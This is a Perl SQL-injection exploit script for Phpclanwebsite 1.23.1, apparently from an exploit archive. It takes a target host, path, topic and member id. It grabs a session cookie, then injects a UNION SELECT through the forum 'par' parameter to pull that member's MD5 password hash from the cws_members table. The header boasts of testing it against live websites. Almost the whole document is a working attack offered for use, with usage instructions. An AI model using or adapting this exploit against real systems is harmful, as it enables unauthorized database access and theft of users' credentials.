#!perl
#Phpclanwebsite 1.23.1 SQL injection exploit by matrix_killer
#Greets to all omega-team members[and specially to EcLiPsE] and also
to h4cky0u[h4cky0u.org], Alpha-Fan, Chameleon and all my friends
#The exploit was tested on phpclan's website and it worked + my local
server and on ra4ev.com
#But on versions below 1.23.1 it doesn't seem to work


use IO::Socket;
$host = $ARGV[0];
$path = $ARGV[1];
$topic = $ARGV[2];
$id = $ARGV[3];


if (ARGV < 4) {
   print "---------------------------------------------------------\n";
   print "-- Phpclanwebsite 1.23.1 SQL Injection sploit --\n";
   print "-- (C)oded by matrix_killer --\n";
   print "-- Contact: matrix_k\abv.bg || matrix_killer\ra4ev.com --\n";
   print "-- Usage: $0 [host] [path] [topic] [id] --\n";
   print "-- Ex: $0 127.0.0.1 cws 2 2 --\n";
   print "---------------------------------------------------------\n";
   exit();
}
$sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort =>
"80",Proto => "tcp") || die "Can't establish a connection\n";


print $sock "GET /$path/index.php?page=forum&func=post&par=$topic HTTP/1.1\n";
print $sock "User-Agent: Mozilla/4.0\n";
print $sock "Host: $host\n\n";
while ($asd = <$sock>) {
         if ($asd =~ /Set-Cookie:/gi) {
              $asd =~ /cuser_id=([a-zA-Z0-9]{32})/;
              $cookie = $1;
         }
}
$sock->close;


$socket = IO::Socket::INET->new(PeerAddr => "$host",PeerPort =>
"80",Proto => "tcp") || die "Can't establish a connection\n";
print "-- Connection Established --\n";


print $socket "GET
/$path/index.php?page=forum&func=post&par=$topic%20UNION%20SELECT%20null,null,null,null,null,null,password,null%20FROM%20cws_members%20WHERE%20member_id=$id/*
HTTP/1.0\n";
print $socket "User-Agent: Mozilla/4.0\n";
print $socket "Host: $host\n";
print $socket "Cookie: cuser_id=$cookie; chitcounter=hitcounter\n\n";
print "-- Waiting... --\n";


while($ans = <$socket>) {
        if ($ans =~ /([a-zA-Z0-9]{32})/){
             if ($ans =~ /cookie/i) {
                  next;
             }
             print "\nmember id: $id \n";
             print "md5 hash: $1 \n";
             exit;
        }
}
print "Sorry there s33ms to be a problem\n";
